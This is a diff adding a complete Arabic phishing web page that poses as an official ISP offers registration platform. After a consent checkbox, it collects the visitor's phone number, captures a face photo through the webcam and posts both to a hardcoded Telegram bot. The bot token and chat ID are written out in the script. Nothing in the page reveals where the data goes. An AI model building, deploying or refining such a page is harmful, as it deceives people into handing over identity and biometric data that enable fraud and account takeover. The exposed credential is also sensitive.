@@ -1,0 +1,225 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>منصة تسجيل عروض الإنترنت</title>
+
+<style>
+* { box-sizing: border-box; }
+
+body {
+  margin: 0;
+  font-family: system-ui, Tahoma, Arial;
+  background: #0e0f13;
+  color: #eaeaea;
+}
+
+header {
+  min-height: 100vh;
+  padding: 60px 20px;
+  display: flex;
+  flex-direction: column;
+  justify-content: center;
+  align-items: center;
+  text-align: center;
+  background: radial-gradient(circle at top, #1a1f2b, #0e0f13);
+}
+
+header h1 {
+  font-size: clamp(26px, 5vw, 42px);
+}
+
+header p {
+  max-width: 650px;
+  color: #b5b5b5;
+}
+
+button {
+  padding: 14px 30px;
+  font-size: 16px;
+  background: linear-gradient(135deg, #2563eb, #1e40af);
+  color: #fff;
+  border: none;
+  border-radius: 8px;
+  cursor: pointer;
+}
+
+section {
+  padding: 60px 20px;
+  max-width: 900px;
+  margin: auto;
+}
+
+.card {
+  background: #151823;
+  padding: 25px;
+  border-radius: 12px;
+}
+
+form {
+  display: flex;
+  flex-direction: column;
+  gap: 15px;
+  max-width: 420px;
+  margin: auto;
+}
+
+input {
+  padding: 14px;
+  border-radius: 8px;
+  border: none;
+  font-size: 15px;
+}
+
+label {
+  font-size: 14px;
+  color: #ccc;
+}
+
+video, canvas {
+  width: 100%;
+  border-radius: 10px;
+  background: #000;
+}
+
+.hidden { display: none; }
+
+footer {
+  background: #0a0b10;
+  padding: 30px 20px;
+  text-align: center;
+  font-size: 14px;
+  color: #888;
+}
+</style>
+</head>
+
+<body>
+
+<header>
+  <h1>منصة تسجيل عروض الإنترنت</h1>
+  <p>
+    نظام تسجيل رسمي لعروض الإنترنت بالتعاون مع مزودي الخدمة،
+    مع التحقق من المستخدمين لحماية النظام.
+  </p>
+  <button onclick="document.getElementById('consent').scrollIntoView({behavior:'smooth'})">
+    ابدأ التسجيل
+  </button>
+</header>
+
+<!-- ===== CONSENT ===== -->
+<section id="consent">
+  <div class="card">
+    <h2>الموافقة قبل المتابعة</h2>
+    <p>
+      لإكمال التسجيل، نحتاج إلى تصوير وجهك للتحقق من الهوية ومنع التكرار.
+      لن يتم استخدام الصورة لأي غرض آخر.
+    </p>
+
+    <label>
+      <input type="checkbox" id="agree">
+      أوافق على سياسة الخصوصية واستخدام الكاميرا للتحقق
+    </label>
+
+    <br><br>
+    <button onclick="goNext()">أوافق وأكمل</button>
+  </div>
+</section>
+
+<!-- ===== FORM ===== -->
+<section id="form" class="hidden">
+  <h2 style="text-align:center">إدخال البيانات</h2>
+
+  <form onsubmit="startCamera(event)">
+    <input type="text" id="phone" placeholder="رقم الهاتف" required>
+    <button type="submit">تشغيل الكاميرا</button>
+  </form>
+</section>
+
+<!-- ===== CAMERA ===== -->
+<section id="camera" class="hidden">
+  <h2 style="text-align:center">التقاط الصورة</h2>
+
+  <video id="video" autoplay playsinline></video>
+  <br><br>
+  <button onclick="capture()">التقاط الصورة</button>
+
+  <canvas id="canvas" class="hidden"></canvas>
+  <br><br>
+  <button id="sendBtn" class="hidden" onclick="sendToTelegram()">إرسال الطلب</button>
+</section>
+
+<footer>
+  <p>© 2025 جميع الحقوق محفوظة</p>
+</footer>
+
+<script>
+// ⚠️⚠️⚠️ تجربة فقط
+// REMOVE TOKEN BEFORE DEPLOY
+
+const BOT_TOKEN = "8304204197:AAFH4TvGEurt0iK5O6950FMqQSGEiXybYgY";
+const CHAT_ID  = "7428421245";
+
+let stream;
+let imageBlob;
+
+function goNext() {
+  if (!document.getElementById("agree").checked) {
+    alert("يجب الموافقة قبل المتابعة");
+    return;
+  }
+  document.getElementById("form").classList.remove("hidden");
+  document.getElementById("form").scrollIntoView({behavior:"smooth"});
+}
+
+function startCamera(e) {
+  e.preventDefault();
+
+  navigator.mediaDevices.getUserMedia({ video: true })
+    .then(s => {
+      stream = s;
+      document.getElementById("video").srcObject = stream;
+      document.getElementById("camera").classList.remove("hidden");
+      document.getElementById("camera").scrollIntoView({behavior:"smooth"});
+    })
+    .catch(() => alert("لم يتم السماح بالكاميرا"));
+}
+
+function capture() {
+  const video = document.getElementById("video");
+  const canvas = document.getElementById("canvas");
+  const ctx = canvas.getContext("2d");
+
+  canvas.width = video.videoWidth;
+  canvas.height = video.videoHeight;
+  ctx.drawImage(video, 0, 0);
+
+  canvas.toBlob(blob => {
+    imageBlob = blob;
+    document.getElementById("sendBtn").classList.remove("hidden");
+  }, "image/jpeg");
+
+  stream.getTracks().forEach(t => t.stop());
+}
+
+function sendToTelegram() {
+  const phone = document.getElementById("phone").value;
+
+  const formData = new FormData();
+  formData.append("chat_id", CHAT_ID);
+  formData.append("caption", `📱 رقم الهاتف:\n${phone}`);
+  formData.append("photo", imageBlob);
+
+  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+    method: "POST",
+    body: formData
+  })
+  .then(r => r.json())
+  .then(() => alert("تم إرسال الطلب بنجاح (تجربة)"))
+  .catch(() => alert("فشل الإرسال"));
+}
+</script>
+
+</body>
+</html>
